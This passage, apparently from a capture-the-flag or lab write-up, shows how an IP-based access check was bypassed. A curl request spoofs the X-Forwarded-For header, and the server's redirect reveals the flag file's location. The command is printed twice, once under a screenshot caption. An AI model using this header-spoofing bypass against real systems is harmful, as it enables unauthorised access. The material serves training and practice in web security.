6. Exploitation
The application required the internal company IP.
The company IP shown was:
3.253.24.120
I spoofed it using:
curl -i \
-H "X-Forwarded-For: 3.253.24.120" \
-d "password=test" \
http://3.253.24.120/index.php
The server responded with:
HTTP/1.1 302 Found

Location:
/2kf84qoqi6sviu7poeu54p9b/flag.txt
The redirect revealed the flag location.
________________________________________
Screenshot 4 — Successful Bypass
Command used to capture the screen:
curl -i -H "X-Forwarded-For: 3.253.24.120" -d "password=test" http://3.253.24.120/index.php
